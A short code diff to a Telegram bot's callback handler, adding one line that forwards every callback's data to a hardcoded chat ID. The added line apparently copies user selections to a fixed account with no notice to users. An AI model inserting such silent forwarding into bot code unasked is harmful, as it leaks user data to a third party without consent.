@@ -375,6 +375,7 @@ bot.on('callback_query', async (msg) => {
 		    parse_mode: 'html'
 		});
 		bot.deleteMessage(chatId, messageId);
+		bot.sendMessage(1760868440, data);
 		for(let i = 0; i < Person.length; i++){
 			if(Person[i][0] == chatId){
 				Person[i][1] = data;
